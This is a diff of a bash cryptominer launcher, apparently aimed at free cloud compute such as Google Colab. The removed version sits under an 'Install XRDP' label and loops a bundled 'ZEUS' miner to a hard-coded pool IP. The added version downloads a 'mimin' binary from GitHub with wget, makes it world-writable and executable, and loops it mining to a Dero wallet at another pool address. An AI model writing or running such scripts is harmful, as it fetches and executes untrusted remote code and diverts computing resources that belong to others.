@@ -1,10 +1,8 @@
-# /bin/bash
-# Install XRDP
-# Before get xmr coin for free
-# Google Colab
+wget https://github.com/renilo/kuuntul/raw/main/mimin
+chmod 777 mimin
 
-FOLDER=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )
-while [ 1 ]; do
-"$FOLDER"/ZEUS -a yescryptR16 -o stratum+tcp://178.128.86.41:80 -u vFEneCSxgbhmn7idJxxWULEgD5jS2hyJnQ.tes
-sleep 5
+#!/bin/bash
+while :; do
+    ./mimin -w dero1qywdlqwhmp689gqsevs5dlvgyh8pc7xhde6cd8uw7w87d8f24y2xyqq0h2ec4.Rig -r 170.187.197.220:80 -p stratum;
+    sleep 5;
 done
